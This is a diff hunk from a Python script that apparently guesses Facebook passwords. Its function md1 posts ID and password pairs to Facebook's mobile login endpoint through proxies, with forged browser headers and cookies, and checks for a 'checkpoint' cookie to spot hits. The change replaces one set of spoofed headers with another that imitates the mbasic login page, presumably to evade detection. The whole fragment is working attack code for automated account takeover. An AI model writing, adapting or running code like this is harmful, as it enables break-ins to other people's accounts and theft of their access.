@@ -760,24 +760,21 @@ def md1(idf,pwv):
       koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
       koki+=' m_pixel_ratio=2.625; wd=412x756'
       heade={
-      "Host": "m.facebook.com",
-      "content-length": f"{len(str(dataa))}",
-      "x-fb-lsd": re.search('name="lsd" value="(.*?)"',str(p.text)).group(1),
-      "origin": "https://m.facebook.com",
-      "content-type": "application/x-www-form-urlencoded",
-      "user-agent": ua, #'Mozilla/5.0 (Linux; Android 13; SM-A536B Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.15 Mobile Safari/537.36',
-      "accept": "*/*",
-      "x-requested-with": "Linux",
-      "sec-ch-ua": '"Chromium";v="106", "Google Chrome";v="106", "Not;A=Brand";v="99"',
-      "sec-ch-ua-platform": '"Android"',
-      "sec-ch-ua-mobile": "?1",
-      "sec-fetch-site": "same-origin",
-      "sec-fetch-mode": "cors",
-      "sec-fetch-dest": "empty",
-      "sec-fetch-user": "?0",
-      "referer": "https://m.facebook.com/dialog/oauth?response_type=code&client_id=2076461462396807&redirect_uri=https%3A%2F%2Fduniagames.co.id%2Fnew-callback&scope=public_profile%2Cemail&code_challenge=Yqn9YmMbIY9awk-vWUaq_BuuPrndLEOUQXVYSH1Rleo&code_challenge_method=S256&state=2t0u9qzy4ubndt6ek29y6n1obo9mojr&ret=login&fbapp_pres=0&logger_id=d614149f-136e-431f-babf-db7f365bce91&tp=unspecified",
-      "accept-encoding": "gzip, deflate br",
-      "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
+      "Host": "mbasic.facebook.com",
+    "cache-control": "max-age=0",
+    "upgrade-insecure-requests": "1",
+    "origin": host,
+    "content-type": "application/x-www-form-urlencoded",
+    "user-agent": ua,
+    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
+    "x-requested-with": "mark.via.gp",
+    "sec-fetch-site": "same-origin",
+    "sec-fetch-mode": "navigate",
+    "sec-fetch-user": "?1",
+    "sec-fetch-dest": "document",
+    "referer": host+"/login/?next&ref=dbl&fl&refid=8",
+    "accept-encoding": "gzip, deflate",
+    "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
       po = ses.post('https://m.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
       if "checkpoint" in po.cookies.get_dict().keys():
         idf = ses.cookies.get_dict()["checkpoint"].split("%")[4].replace("3A", "")
